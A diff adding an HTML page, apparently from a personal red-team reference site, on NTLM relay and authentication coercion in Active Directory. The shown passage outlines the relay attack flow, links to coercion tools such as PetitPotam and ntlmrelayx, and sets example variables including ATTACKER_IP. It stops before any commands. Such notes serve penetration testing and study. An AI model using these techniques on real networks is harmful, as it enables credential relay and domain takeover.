@@ -1,0 +1,3241 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/AD/NTLM_Relay_and_Coercion/">
+      
+      
+        <link rel="prev" href="../Kerberos_Attacks/">
+      
+      
+        <link rel="next" href="../ACL_Abuse/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>NTLM Relay & Coercion - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ntlm-relay-and-coercion" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NTLM Relay & Coercion
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unauth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Auth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Credential_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberos_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ntlm-relay-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NTLM Relay Basics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Relay
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP Relay
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adcs-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ADCS Relay
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#webdav-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WebDAV Relay
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#coercion-primitives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Coercion Primitives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printerbug" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PrinterBug
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PetitPotam
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dfscoerce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DFSCoerce
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shadowcoerce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ShadowCoerce
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#coercer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Coercer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#relay-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Relay Checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ACL_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lateral_Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Priv_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Domain_Compromise/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Persistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Forest_and_Trusts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross Forest & Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Toolset/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toolset
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ntlm-relay-and-coercion">NTLM Relay and Coercion</h1>
+<p>NTLM relay and coercion techniques abuse the way Windows systems authenticate to network services.</p>
+<p>The general idea is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Victim authenticates to attacker
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Attacker relays NTLM authentication to target service
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Target accepts authentication
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Attacker performs action as the relayed identity
+</span></code></pre></div>
+<p>Authentication coercion is often used to force or trigger a machine or user to authenticate to the attacker-controlled listener.</p>
+<p>Useful resources:</p>
+<ul>
+<li><a href="https://www.thehacker.recipes/ad/movement/ntlm/relay">The Hacker Recipes - NTLM Relay</a></li>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks - Active Directory Methodology</a></li>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html">HackTricks - Printer Spooler Service Abuse</a></li>
+<li><a href="https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required">NetExec - SMB Signing Not Required</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">Impacket ntlmrelayx</a></li>
+<li><a href="https://github.com/p0dalirius/Coercer">Coercer</a></li>
+<li><a href="https://github.com/topotam/PetitPotam">PetitPotam</a></li>
+<li><a href="https://github.com/Wh04m1001/DFSCoerce">DFSCoerce</a></li>
+<li><a href="https://github.com/ShutdownRepo/ShadowCoerce">ShadowCoerce</a></li>
+<li><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">Dirk-jan Mollema - NTLM relaying to AD CS</a></li>
+<li><a href="https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs">BloodHound - Coerce and Relay NTLM to AD CS</a></li>
+<li><a href="https://wadcoms.github.io/wadcoms/Impacket-NTLMRelayX/">WADComs - Impacket NTLMRelayX</a></li>
+</ul>
+<p>Basic variables used in examples:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NETBIOS</span><span class="o">=</span>CORP
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>alice
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password123!&#39;</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_IP</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_HOST</span><span class="o">=</span>dc01.corp.local
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">ATTACKER_IP</span><span class="o">=</span><span class="m">10</span>.10.14.5
